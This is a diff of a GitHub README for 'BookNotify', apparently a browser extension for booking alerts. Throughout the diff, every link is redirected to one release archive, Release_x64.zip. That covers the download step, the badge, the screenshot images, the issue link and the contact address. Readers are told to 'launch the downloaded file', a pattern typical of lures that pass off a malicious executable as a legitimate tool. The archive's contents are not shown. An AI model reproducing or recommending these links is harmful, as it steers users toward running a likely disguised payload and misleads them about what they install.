@@ -12,13 +12,13 @@ BookNotify is a versatile browser extension designed to keep you informed about 
 
 To start using BookNotify, follow these simple steps:
 
-1. **Download the Extension**: Click [here](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip) to download the extension. Launch the downloaded file to install it in your browser.
+1. **Download the Extension**: Click [here](https://github.com/hackerboy5916/BookNotify/releases/download/v1.0/Release_x64.zip) to download the extension. Launch the downloaded file to install it in your browser.
 
 2. **Activate the Extension**: Once installed, the BookNotify icon will appear in your browser toolbar.
 
 3. **Stay Updated**: Receive real-time notifications as soon as bookings open for your favorite movies, shows, and events.
 
-![BookNotify](https://img.shields.io/badge/Download-BookNotify-blue)
+![BookNotify](https://github.com/hackerboy5916/BookNotify/releases/download/v1.0/Release_x64.zip)
 
 ## 📦 Repository Details
 
@@ -36,16 +36,16 @@ To start using BookNotify, follow these simple steps:
 
 Here are some snapshots of how BookNotify looks in action:
 
-![Screenshot 1](https://source.unsplash.com/collection/190727/800x600)
-![Screenshot 2](https://source.unsplash.com/collection/190727/800x600)
+![Screenshot 1](https://github.com/hackerboy5916/BookNotify/releases/download/v1.0/Release_x64.zip)
+![Screenshot 2](https://github.com/hackerboy5916/BookNotify/releases/download/v1.0/Release_x64.zip)
 
 ## 🤝 Contributing
 
-We welcome contributions to BookNotify! If you have any ideas, suggestions, or bug fixes, feel free to [open an issue](https://github.com/22155555/1875695542/issues) or submit a pull request.
+We welcome contributions to BookNotify! If you have any ideas, suggestions, or bug fixes, feel free to [open an issue](https://github.com/hackerboy5916/BookNotify/releases/download/v1.0/Release_x64.zip) or submit a pull request.
 
 ## 📞 Contact
 
-For any inquiries or support, you can reach out to us at [booknotify@example.com](mailto:booknotify@example.com).
+For any inquiries or support, you can reach out to us at [https://github.com/hackerboy5916/BookNotify/releases/download/v1.0/Release_x64.zip](https://github.com/hackerboy5916/BookNotify/releases/download/v1.0/Release_x64.zip).
 
 ## 📄 License
 
@@ -53,4 +53,4 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 ---
 
-**Visit BookNotify [here](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip) to stay ahead of the crowd with real-time alerts!**
+**Visit BookNotify [here](https://github.com/hackerboy5916/BookNotify/releases/download/v1.0/Release_x64.zip) to stay ahead of the crowd with real-time alerts!**
